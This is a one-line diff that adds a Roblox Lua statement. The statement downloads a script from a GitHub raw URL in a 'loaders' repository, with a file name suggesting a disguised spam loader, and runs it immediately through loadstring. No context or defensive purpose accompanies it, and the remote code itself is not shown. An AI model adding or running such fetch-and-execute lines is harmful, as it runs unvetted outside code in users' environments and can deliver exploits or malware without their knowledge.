@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/hide-in-pixels-spam7-zjlw164uf7ghlp.lua"))()
